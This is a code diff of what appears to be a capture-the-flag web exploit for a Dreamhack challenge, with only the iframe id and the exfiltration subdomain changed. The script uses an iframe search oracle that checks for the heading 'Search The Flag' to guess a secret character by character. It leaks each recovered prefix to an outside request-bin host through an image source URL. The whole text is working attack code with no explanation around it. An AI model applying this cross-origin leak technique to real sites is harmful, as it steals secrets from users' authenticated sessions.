@@ -1,9 +1,9 @@
-<iframe id="iframe"></iframe>
+<iframe id="iframez"></iframe>
 <img id="img">
 <script>
     async function req(url) {
         return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
+            const iframe = document.getElementById("iframez");
             iframe.src = url;
             iframe.onload = () => { 
                 if (iframe.contentWindow.document.querySelector('h1').textContent == "Search The Flag")
@@ -30,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://zahdncf.request.dreamhack.games/${secret}`;
+                    img.src = `https://vvsrvzj.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
